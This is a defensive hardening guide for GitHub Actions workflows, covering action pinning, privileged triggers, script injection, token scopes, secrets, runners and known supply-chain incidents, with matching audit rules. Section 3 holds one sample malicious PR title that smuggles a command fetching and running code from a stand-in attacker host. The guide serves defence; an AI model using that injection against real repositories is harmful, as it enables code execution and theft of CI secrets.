# GitHub Actions hardening

Each section: the risk, the safe pattern, and the matching `ci_audit.py` rule.
Platform facts checked 2026-11-19 against the GitHub changelog and docs.

## Contents

1. Pin actions to a commit SHA
2. Triggers that run with secrets
3. Script injection
4. Token permissions
5. Secrets
6. Runners
7. Other checks
8. Known incidents and indicators
9. Platform controls (2025-2026)

## 1. Pin actions to a commit SHA (GHA-001)

Tags and branches are mutable. In March 2025 the tags of `tj-actions/changed-files` were repointed to a malicious commit that dumped CI secrets into build logs; workflows pinned to a SHA were not affected.

```yaml
# before
- uses: some-org/deploy@v2
# after
- uses: some-org/deploy@3f1c2d4e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d # v2.4.1
```

- Resolve the SHA yourself: `git ls-remote https://github.com/some-org/deploy refs/tags/v2.4.1` (for annotated tags use the `^{}` line)
- Keep the version in a comment so Dependabot/Renovate can bump it:
  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule: {interval: weekly}
  ```
- A pinned action can still pull unpinned things at run time (a Docker image by tag, a script by URL). Read what the action does
- Org/repo setting "Require actions to be pinned to a full-length commit SHA" (allowed actions policy, added 2025-08-15) and an allow-list of actions enforce this centrally; the same policy can block named actions or versions
- Workflow lockfiles (`gh actions-lock`, GA 2026-10-28) record the resolved SHA of every action, including nested ones in composite actions and reusable workflows; commit the lockfile and review its diffs like a package lockfile

## 2. Triggers that run with secrets (GHA-002, GHA-003)

| Trigger | Secrets | Token | Code it runs by default |
|---|---|---|---|
| `pull_request` from a fork | no | read-only | PR merge commit |
| `pull_request_target` | yes | can write | base branch |
| `workflow_run` | yes | can write | default branch |
| `issue_comment` | yes | can write | default branch |

`pull_request_target` is safe only while it never builds, tests or installs PR code. Checking out `github.event.pull_request.head.sha` and then running `npm install`, `make` or tests gives the PR author your secrets ("pwn request").

Safe split when a PR build needs to publish something:

```yaml
# build.yml: untrusted, no secrets
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: {contents: read}
    steps:
      - uses: actions/checkout@<sha> # v4
      - run: npm ci --ignore-scripts && npm run build
      - uses: actions/upload-artifact@<sha> # v4
        with: {name: site, path: dist}

# publish.yml: trusted, never runs PR code, treats the artifact as data
on:
  workflow_run:
    workflows: [build]
    types: [completed]
```

Validate the artifact (size, file types, no paths outside the target dir) before using it. `ci_audit.py` flags `workflow_run` plus `download-artifact` as GHA-032 so someone checks this.

`actions/checkout` v7.0.0 (2026-06-18) refuses to check out fork PR code under `pull_request_target` and `workflow_run`; the same guard was backported on 2026-07-20 to v6.1.0, v5.1.0, v4.4.0, v3.7.0 and v2.8.0. It is a seat belt, not a fix:
- `allow-unsafe-pr-checkout: true` turns it off (GHA-004). Remove the input; if a maintainer really needs PR code, run it in an unprivileged `pull_request` job
- It only guards the checkout action. `gh pr checkout`, `git fetch origin pull/N/head`, `refs/pull/...` in `run:` and `issue_comment` bots that pass a PR ref still bring PR code in (GHA-005)
- Older pins below the backport versions have no guard at all, so keep checkout current through Dependabot

## 3. Script injection (GHA-010)

`${{ }}` is substituted into the script text before the shell starts. A PR titled `a"; curl https://attacker.example.test/x | sh; echo "` becomes code.

```yaml
# before
- run: echo "PR: ${{ github.event.pull_request.title }}"
# after
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $PR_TITLE"
```

Same for `actions/github-script`: read `process.env.X` or `context.payload`, never interpolate into the script body.

Attacker-controlled contexts: issue and PR title/body, comment and review bodies, discussion title/body, `github.head_ref` and `pull_request.head.ref/label`, commit messages and author name/email, wiki page names, `workflow_run.head_branch`. `inputs.*` of `workflow_dispatch` are controlled by anyone with write access; treat them the same way.

## 4. Token permissions (GHA-020, GHA-021)

```yaml
permissions:
  contents: read          # workflow default

jobs:
  release:
    permissions:
      contents: write     # only this job can push tags/releases
      id-token: write     # only if it uses OIDC
```

- Set the repository and organization default to read-only (Settings, Actions, Workflow permissions)
- Never `write-all`
- `actions/checkout` stores the token in `.git/config` by default; add `persist-credentials: false` when later steps do not push

## 5. Secrets (GHA-030)

- Pass secrets via `env:` to the one step that needs them; never `echo` them, even "for debugging"
- Masking is string matching: base64, URL-encoding or splitting a secret defeats it
- Never `toJSON(secrets)`
- Prefer OIDC over long-lived cloud keys:
  ```yaml
  permissions: {id-token: write, contents: read}
  steps:
    - uses: aws-actions/configure-aws-credentials@<sha> # v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/deploy
        aws-region: us-east-1
  ```
  Restrict the role's trust policy on the `sub` claim (`repo:org/repo:ref:refs/heads/main` or an environment), not just the audience
- Use environments with required reviewers for production secrets

## 6. Runners (GHA-031)

- Self-hosted runners on public repos can be reached by fork PRs. Use them only for private repos or with ephemeral, single-use runners (`--ephemeral`, or autoscaled VMs/containers)
- Set "Require approval for all outside collaborators" for fork PR workflows
- Do not let runners share credentials, Docker sockets or caches with production

## 7. Other checks

- `curl | sh` in steps (GHA-040): download, verify checksum, run
- `ACTIONS_ALLOW_UNSECURE_COMMANDS` (GHA-041): remove; use `$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`
- Writing to `$GITHUB_ENV` or `$GITHUB_PATH` in a privileged-trigger workflow (GHA-011): untrusted data there sets `LD_PRELOAD`, `NODE_OPTIONS` or `PATH` for every later step. Use `$GITHUB_OUTPUT` and pass values explicitly through `env:`
- `secrets: inherit` on a reusable workflow call (GHA-022) hands every secret to the called workflow. Pass only the ones it needs under `secrets:`
- Container or service `credentials.password` written as a literal (GHA-043). Use `${{ secrets.REGISTRY_TOKEN }}`
- `curl`/`wget` over `http://` (GHA-044): a network attacker can swap the file. Use HTTPS and check a checksum
- Caches are shared across branches with restore rules; do not cache build outputs from untrusted PRs into keys trusted jobs restore
- Protect `.github/workflows/` with CODEOWNERS and branch protection

## 8. Known incidents and indicators

| Incident | Date | What to check | Rule |
|---|---|---|---|
| `tj-actions/changed-files` (CVE-2025-30066, in CISA KEV) | 2025-03 | any use; malicious commit `0e58ed8...`. Rotate secrets from runs between 2025-03-14 and 2025-03-15 | GHA-042 |
| `reviewdog/action-setup@v1` (CVE-2025-30154, in KEV) | 2025-03-11 | `@v1` of action-setup and the reviewdog actions that call it | GHA-042 |
| Shai-Hulud npm worm | 2025-09-15 | `.github/workflows/shai-hulud-workflow.yml` in any repo | GHA-045 |
| Shai-Hulud 2.0 | 2025-11-24 | `.github/workflows/discussion.yaml` on `discussion` events, a self-hosted runner named `SHA1HULUD` | GHA-045 |

A GHA-045 hit means a token with repo write access was stolen. Rotate GitHub, npm and cloud tokens first, remove unknown self-hosted runners in repo and org settings, then delete the file.

## 9. Platform controls (2025-2026)

- SHA pinning and block lists in the allowed actions policy (2025-08-15)
- Workflow execution protections (GA 2026-09-17, enforced by default from 2026-12-02): stops untrusted events from running privileged workflows unless a maintainer approves. Check your org settings before the default flips
- Workflow lockfiles with `gh actions-lock` (GA 2026-10-28)
- `actions/checkout` fork PR guard (v7.0.0 and backports, see section 2)
- npm trusted publishing (OIDC) removes long-lived npm tokens from CI; see `dependency-hygiene.md`
- Static audit: `zizmor` (docs.zizmor.sh) covers more patterns than `ci_audit.py` (template injection data flow, cache poisoning, impostor commits) and is worth running in CI next to it
